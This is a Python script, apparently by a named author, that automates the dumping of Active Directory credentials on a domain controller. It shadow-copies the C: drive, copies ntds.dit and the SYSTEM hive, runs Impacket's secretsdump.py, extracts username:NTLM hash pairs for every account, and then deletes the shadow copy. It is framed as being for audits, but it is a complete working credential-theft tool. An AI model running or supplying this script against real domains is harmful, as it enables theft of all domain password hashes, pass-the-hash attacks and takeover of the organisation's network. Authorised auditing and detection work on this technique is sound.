"""
extract_hashes.py

Author: Yousef Emad Sabouba
Date: August 2025

Description:
------------
This script automates the extraction of NTLM password hashes from an Active Directory domain controller
by creating a Volume Shadow Copy of the NTDS.dit and SYSTEM registry hive. It uses Impacket's secretsdump.py
to dump credentials locally and filters out username:NTLM hash pairs for audit purposes.

Steps:
1. Creates a shadow copy of the C: drive using DiskShadow.
2. Copies NTDS.dit and SYSTEM hive from the shadow path.
3. Runs secretsdump.py (via subprocess) on the extracted files.
4. Filters and saves NTLM hashes in a clean format (username:hash).
5. Deletes the created shadow copy to clean up.

Output:
- C:\NTDSDump\hashes.txt         ← Full secretsdump output
- C:\NTDSDump\user_hashes.txt    ← Cleaned username:NTLM hash pairs

Note:
- Requires administrative privileges.
- secretsdump.py path must be updated if installed elsewhere.
- Ensure Impacket is installed.

Usage:
Run this script as Administrator on the domain controller:
    python extract_hashes.py
"""

import subprocess
import re
import os

ntds_dir = "C:\\NTDSDump"
os.makedirs(ntds_dir, exist_ok=True)

# Save DiskShadow script locally
ds_file_path = "C:\\NTDSDump\\diskshadow_script.txt"
with open(ds_file_path, "w") as f:
    f.write("set context persistent nowriters\n")
    f.write("add volume C: alias myShadow\n")
    f.write("create\n")

# Run DiskShadow
print("[+] Running DiskShadow to create shadow copy...")
subprocess.run(f'diskshadow /s "{ds_file_path}"', shell=True)

# Parse shadow path
print("[+] Reading shadow copy info...")
result = subprocess.run("vssadmin list shadows", capture_output=True, text=True, shell=True)
shadow_path = None
for line in result.stdout.splitlines():
    if "GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" in line:
        shadow_path = line.strip().split(": ", 1)[-1]
print(f"[+] Using shadow copy path: {shadow_path}")

# Copy files
ntds_src = f"{shadow_path}\\Windows\\NTDS\\ntds.dit"
system_src = f"{shadow_path}\\Windows\\System32\\config\\SYSTEM"
ntds_dst = os.path.join(ntds_dir, "ntds.dit")
system_dst = os.path.join(ntds_dir, "SYSTEM")

print("[+] Copying ntds.dit and SYSTEM hive...")
subprocess.run(f'copy "{ntds_src}" "{ntds_dst}" /Y', shell=True)
subprocess.run(f'copy "{system_src}" "{system_dst}" /Y', shell=True)

# Run secretsdump.py
print("[+] Extracting hashes with secretsdump.py...")
hashes_path = os.path.join(ntds_dir, "hashes.txt")
secrets_cmd = r"python C:\Users\Administrator\impacket\examples\secretsdump.py" + f" -system {system_dst} -ntds {ntds_dst} LOCAL > {hashes_path} 2>&1"
subprocess.run(secrets_cmd, shell=True)

# Extract username + NT hash
print("[+] Filtering NTLM hashes...")
user_hashes = []
with open(hashes_path, "r") as infile:
    for line in infile:
        parts = line.strip().split(":")
        if len(parts) >= 4 and len(parts[2]) == 32 and len(parts[3]) == 32:
            username = parts[0].split("\\")[-1]
            user_hashes.append(f"{username}:{parts[3]}")

clean_path = os.path.join(ntds_dir, "user_hashes.txt")
with open(clean_path, "w") as outfile:
    outfile.write("\n".join(user_hashes))

print(f"[+] Cleaned hashes saved to: {clean_path}")

# Delete the shadow copy
print("[+] Deleting shadow copy...")
shadow_matches = re.findall(r"Shadow Copy ID: ({.*?})\s+.*?Device\\HarddiskVolumeShadowCopy(\d+)", result.stdout, re.DOTALL)
for sid, num in shadow_matches:
    if shadow_path.endswith(f"ShadowCopy{num}"):
        print(f"[+] Deleting shadow copy ID: {sid}")
        subprocess.run(f"vssadmin delete shadows /Shadow={sid} /Quiet", shell=True)
        break

print("[✔] Done. Shadow copy deleted. Files saved in C:\\NTDSDump")
